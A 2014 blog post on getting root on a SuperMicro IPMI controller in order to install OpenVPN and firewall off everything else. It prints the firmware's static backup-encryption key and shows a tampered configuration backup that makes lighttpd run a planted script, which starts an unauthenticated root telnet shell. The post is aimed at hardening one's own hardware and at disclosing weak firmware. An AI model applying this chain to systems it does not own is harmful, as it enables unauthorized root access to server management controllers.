---
layout: post
title:  "Securing SuperMicro’s IPMI with OpenVPN"
date:   2014-01-27 18:30:00
categories: Artikel
Aliases:
  - /Artikel/supermicro_ipmi_openvpn
---


<p>
In my last article, I wrote about my experiences with my new SuperMicro server,
and a big part of that article was about the <a
href="http://en.wikipedia.org/wiki/Intelligent_Platform_Management_Interface">Intelligent
Platform Management Interface (IPMI)</a> which is included in the SuperMicro
X9SCL-F mainboard I bought.
</p>

<p>
In that previous article, I already suggested that the code quality of the IPMI
firmware is questionable at best, and this article is in part proof and in part
mitigation :-).
</p>

<h2>Getting a root shell on the IPMI</h2>

<p>
When doing modifications on an embedded system, it is a good idea to have an
interactive shell available for much easier and faster testing/debugging. Also,
getting a root shell can be considered a prerequisite for the modifications we
are about to make.
</p>

<p>
The following steps are based on <a
href="https://plus.google.com/+TobiasDiedrich/posts/Bq44KkBT3vK">Tobias
Diedrich’s instructions “How to get root on and secure access to your
Supermicro IPMI”</a>.
</p>

<p>
After downloading the version of the IPMI firmware that is running on my
machine from <a href="http://supermicro.com/support/bios/firmware0.aspx">the
SuperMicro website</a> (filename SMT_X9_315.zip) and unzipping it, we have a
bunch of executables for flashing the firmware plus a file called
SMT_X9_315.bin which contains the actual firmware.
</p>

<p>
Running <code>binwalk(1)</code> on SMT_X9_315.bin reveals:
</p>

<pre>
$ binwalk SMT_X9_315.bin

DECIMAL   	HEX       	DESCRIPTION
-------------------------------------------------------------------------------------------------------
1572864   	0x180000  	CramFS filesystem, little endian size 8372224 version #2 sorted_dirs CRC 0xe0f8f23d, edition 0, 5156 blocks, 1087 files  
9961472   	0x980000  	Zip archive data, at least v2.0 to extract, compressed size: 1124880, uncompressed size: 2331112, name: "kernel.bin"  
11086504  	0xA92AA8  	End of Zip archive 
12058624  	0xB80000  	CramFS filesystem, little endian size 1945600 version #2 sorted_dirs CRC 0x75aaf428, edition 0, 926 blocks, 204 files  
</pre>

<p>
So let’s extract the two CramFS file systems and mount them for inspection:
</p>

<pre>
$ dd if=SMT_X9_315.bin bs=1 skip=1572864 count=8372224 of=cramfs1
$ dd if=SMT_X9_315.bin bs=1 skip=12058624 count=1945600 of=cramfs2
$ mkdir mnt1 mnt2
# mount -o loop -t cramfs cramfs1 mnt1
# mount -o loop -t cramfs cramfs2 mnt2
</pre>

<p>
In <code>mnt1</code> you’ll find the root file system, and it looks like
<code>mnt2</code> contains vendor-specific branding, i.e. their KVM client,
images and CGI binaries for the web interface.
</p>

<p>
The firmware image itself is not the only binary that you’ll come in contact
with when dealing with the IPMI. In “Maintenance → IPMI configuration” you can
save your current IPMI configuration into a binary file and restore it later.
Interestingly, these files start with the text “Salted__”, which is typical for
files encrypted with <code>openssl(1)</code>.
</p>

<p>
And indeed, after a bit of digging, we can find the binary that is responsible
for encrypting/decrypting the configuration dumps and a bunch of interesting
strings in it:
</p>

<pre>
$ strings mnt1/bin/ipmi_conf_backup_tool | grep -A 1 -B 1 -m 1 openssl
CKSAM1SUCKSAM1SUASMUCIKSASMUCIKS
openssl %s -d -in %s -out %s -k %s
aes-256-cbc
</pre>

<p>
And indeed, we can decrypt the file with the following command:
</p>

<pre>
openssl aes-256-cbc -d -in backup.bin -out backup.bin.dec \
    -k CKSAM1SUCKSAM1SUASMUCIKSASMUCIKS
</pre>

<p>
The resulting <code>backup.bin.dec</code> then contains the magic string
<code>ATEN\x01\x00</code> (where <code>\x01</code> is a byte with value 1)
followed by a tar.gz archive:
</p>

<pre>
dd skip=6 bs=1 status=none if=backup.bin.dec of=backup.tar.gz
</pre>

<p>
The tar.gz archive contains a directory called <code>preserve_config</code>
which in turn contains a bunch of configuration files. Interestingly, the full
<code>lighttpd.conf</code> lives in that tarball, presumably because you can
change the port (they actually run <code>sed(1)</code> on the config file).
</p>

<p>
Now, the idea is to configure lighttpd in such a way that it will execute a
file under our control. You can accomplish this by changing
<code>lighttpd.conf</code> as follows:
</p>

<pre>
--- lighttpd.conf.O	1970-01-01 01:00:00.000000000 +0100
+++ lighttpd.conf	2014-01-25 19:30:35.476345845 +0100
@@ -14,7 +14,7 @@
 server.modules              = (
 #                               "mod_rewrite",
 #                               "mod_redirect",
-#                               "mod_alias",
+                                "mod_alias",
 #                               "mod_access",
 #                               "mod_trigger_b4_dl",
 #                               "mod_auth",
@@ -174,7 +174,7 @@
 #server.errorfile-prefix    = "/srv/www/errors/status-"
 
 ## virtual directory listings
-#dir-listing.activate       = "enable"
+dir-listing.activate       = "enable"
 ## select encoding for directory listings
 #dir-listing.encoding        = "utf-8"
 
@@ -224,7 +224,8 @@
 
 #### CGI module
 cgi.assign                 = ( ".pl"  => "/web/perl",
-                               ".cgi" => "" )
+                               ".cgi" => "",
+                               ".sh" => "/bin/sh")
 #
 server.use-ipv6 = "enable"
 
@@ -327,3 +328,5 @@
 #include_shell "echo var.a=1"
 ## the above is same as:
 #var.a=1
+
+alias.url += ( "/root" => "/" )
</pre>

<p>
Now all we need is a custom .sh script somewhere on the file system and we are
done. The program that restores backup files is
<code>mnt1/bin/restore_file.sh</code>, and if you have a look at it you’ll see
that it only copies certain files over from the uploaded tarball.
</p>

<p>
If you have a really close look, though, you’ll realize that it also copies
entire directories like <code>preserve_config/ntp</code> without any extra
checking. So let’s put our code in there:
</p>

<pre>
cat > ntp/start_telnet.sh <<'EOT'
#!/bin/sh
/usr/sbin/telnetd -l /bin/sh
EOT
</pre>

<p>
In case you wondered, telnetd is already in the IPMI image since they are using
busybox and presumably use telnet while developing :-).
</p>

<p>
The final step is to create a new tar.gz archive with your modified
preserve_config and upload that either in the IPMI web interface or flash it
using the <code>lUpdate</code> tool that you can find in the IPMI firmware zip
file. While the web interface will accept unencrypted tar.gz files for
backwards compatibility, I’m not sure whether lUpdate will accept them,
therefore I’ll explain how to properly encrypt it:
</p>

<pre>
$ cat > encrypt.sh <<'EOT'
#!/bin/bash
# The file is encrypted with a static key and consists of ATEN\x01\x00 followed
# by a tar.gz archive.

KEY=CKSAM1SUCKSAM1SUASMUCIKSASMUCIKS
(echo -en "ATEN\x01\x00"; cat $1) | openssl aes-256-cbc -in /dev/stdin -out ${1}.bin -k $KEY
EOT
$ tar czf backup_patched.tar.gz preserve_config
$ ./encrypt.sh backup_patched.tar.gz
$ scp backup_patched.tar.gz.bin box:
box # ./lUpdate -i kcs -c -f ~/backup_patched.tar.gz.bin -r y
</pre>

<p>
After the IPMI rebooted (give it a minute), you should be able to navigate to
http://ipmi/root/nv/ntp/start_telnet.sh and get an HTTP/500 error. Afterwards,
connect via telnet to the IPMI and you should get a root shell.
</p>

<h2>Getting OpenVPN to work</h2>

<p>
Now that we have a root shell, we can try to get OpenVPN to work temporarily
and then make it persistent later. The first step is to cross-compile OpenVPN
for the armv5tejl architecture which the IPMI uses.
</p>

<p>
First, download the toolchain (<a
href="ftp://ftp.supermicro.com/GPL/SMT/SDK_SMT_X9_317.tar.gz">SDK_SMT_X9_317.tar.gz</a>
(727 MB)) from SuperMicro’s FTP server and extract it. Run
<code>./BUILD.sh</code> and watch it fail if you have a x86-64 machine. Then,
apply the following patch and run <code>./BUILD.sh</code> again:
</p>

<pre>
--- OpenSSL/openssl/config.O    2014-01-11 13:09:40.012461895 +0100
+++ OpenSSL/openssl/config      2014-01-11 13:10:17.749870032 +0100
@@ -53,6 +53,11 @@
 SYSTEM=`(uname -s) 2>/dev/null`  || SYSTEM="unknown"
 VERSION=`(uname -v) 2>/dev/null` || VERSION="unknown"

+MACHINE="armv5tejl"
+RELEASE="2.6.17.WB_WPCM450.1.3"
+SYSTEM="Linux"
+VERSION="#3 Thu Oct 31 16:15:24 PST 2013"
+

 # Now test for ISC and SCO, since it is has a braindamaged uname.
 #
</pre>

<p>
After at least OpenSSL was built successfully, set up a few variables (based on
<code>ProjectConfig-HERMON</code>), download and build OpenVPN:
</p>

<pre>
export CROSS_COMPILE=$PWD/ToolChain/Host/HERMON/gcc-3.4.4-glibc-2.3.5-armv4/arm-linux/bin/arm-linux-
export ARCH=arm
export CROSS_COMPILE_BIN_DIR=$PWD/ToolChain/Host/HERMON/gcc-3.4.4-glibc-2.3.5-armv4/arm-linux/bin
export TC_LOCAL=$PWD/ToolChain/Host/HERMON/gcc-3.4.4-glibc-2.3.5-armv4/arm-linux/arm-linux
export PATH=$CROSS_COMPILE_BIN_DIR:$PATH

mkdir OpenVPN
cd OpenVPN
wget http://swupdate.openvpn.net/community/releases/openvpn-2.3.2.tar.gz
tar xf openvpn-2.3.2.tar.gz
cd openvpn-2.3.2

CFLAGS="-I$PWD/../../OpenSSL/openssl/local/include" \
CPPFLAGS="-I$PWD/../../OpenSSL/openssl/local/include" \
LDFLAGS="-L$PWD/../../OpenSSL/openssl/local/lib -lcrypto -lssl" \
CC=arm-linux-gcc \
  ./configure --enable-small --disable-selinux --disable-systemd \
    --disable-plugins --disable-debug --disable-eurephia \
    --disable-pkcs11 --enable-password-save --disable-lzo \
    --with-crypto-library=openssl --build=arm-linux-gnueabi \
    --host=x86_64-unknown-linux-gnu --prefix=/usr
</pre>

<p>
Now, if you copy that openvpn binary to the IPMI and run it, you’ll notice that
the kernel is missing the tun module, so that OpenVPN cannot actually create
its tun0 interface. Therefore, let’s enable that module in the kernel
configuration and rebuild:
</p>

<pre>
sed -i 's/# CONFIG_TUN is not set/CONFIG_TUN=m/g' \
  Kernel/Host/HERMON/Board/SuperMicro_X7SB3/config \
  Kernel/Host/HERMON/linux/.config \
  Kernel/Host/HERMON/config
./BUILD.sh
ls -l Kernel/Host/HERMON/linux/drivers/net/tun.ko
</pre>

<p>
Now, after copying tun.ko to the IPMI, you can get OpenVPN to work with the
following steps:
</p>

<pre>
# insmod /tmp/tun.ko
# mknod /tmp/tun c 10 200
# /tmp/openvpn --config /tmp/openvpn.conf --verb 9
</pre>

<h2>“Properly integrating” OpenVPN</h2>

<p>
Since I only have one SuperMicro X9SCL-F board and no development environment,
I did not want to try to build a complete IPMI firmware and flash it. Instead,
I decided to integrate OpenVPN by putting it into the NVRAM, where all the
other configs live. That flash partition is 1.3M big, so we don’t have a lot of
space, but it’s doable.
</p>

<p>
First of all, we need a script that will ungzip the OpenVPN binary, load the
tun module, create the device node and then start OpenVPN in daemon mode.
Furthermore, the script should enable telnet within the VPN for easy debugging,
and it should set up iptables rules to block anything but the VPN. I call this
script <code>start_openvpn.sh</code>:
</p>

<pre>
#!/bin/sh
# This script will be run multiple times, so exit if the work is already done.
[ -e /tmp/openvpn ] && exit 0
# Do not generate any output, otherwise the lighttpd config may break.
exec >/tmp/ov.log 2>&1

/bin/gunzip -c /nv/ntp/openvpn.gz > /tmp/openvpn
/bin/chmod +x /tmp/openvpn
/sbin/insmod /nv/ntp/tun.ko
/bin/mknod /tmp/tun c 10 200
/tmp/openvpn --config /nv/ntp/openvpn.conf --daemon
/usr/bin/setsid /nv/ntp/telnet_watchdog.sh &

/sbin/iptables -A INPUT -p tcp --dport 1194 -j ACCEPT &&
/sbin/iptables -A INPUT -s 10.137.0.0/24 -j ACCEPT &&
/sbin/iptables -A INPUT -p udp -s 8.8.8.8 -j ACCEPT &&
/sbin/iptables -A INPUT -p udp --sport 123 -j ACCEPT &&
/sbin/iptables -A INPUT -p icmp -s 10.1.2.0/23 -j ACCEPT &&
/sbin/iptables -A INPUT -j DROP
</pre>

<p>
The referenced <code>telnet_watchdog.sh</code> looks as follows:
</p>

<pre>
#!/bin/sh
# /SMASH/chport executes “killall telnetd” and is run after /etc/init.d/httpd
# start, so it will kill our telnetd. This watchdog will restart telnetd
# whenever it gets killed.
while :
do
    /usr/sbin/telnetd -l /bin/sh -b 10.137.0.1 -F
done
</pre>

<p>
The <code>openvpn.conf</code> looks like this:
</p>

<pre>
dev tun
dev-node /tmp/tun
ifconfig 10.137.0.1 10.137.0.2
secret /nv/ntp/openvpn.secret
port 1194
proto tcp-server
user nobody
persist-key
persist-tun
script-security 2
keepalive 10 60
# TODO: This is a lower bound. Depending on your network setup,
# a higher MTU is possible.
link-mtu 1280
</pre>

<p>
I’m using <code>proto tcp-server</code> because I only have SSH
port-forwardings available into the management VLAN, otherwise I would just use
the default <code>proto udp</code>.
</p>

<p>
Instead of the <code>lighttpd.conf</code> modifications I described above, this
time we can use a simpler way of invoking this script:
</p>

<pre>
echo 'include_shell "/nv/ntp/start_openvpn.sh"' >> lighttpd.conf
</pre>

<h2>Tarball</h2>

<p>
You can grab a <a href="/supermicro-ipmi-openvpn.tar.bz2">tarball (247 KiB)</a>
with all the files you need to extract to the <code>ntp/</code> subdirectory.
</p>

<h2>Conclusion</h2>

<p>
In case a SuperMicro or ATEN engineer is reading this, please add built-in
OpenVPN support as a feature ;-).
</p>

<p>
Apart from that, happy hacking, and enjoy the warm fuzzy feeling of your IPMI
interface finally being somewhat secure! :-)
</p>
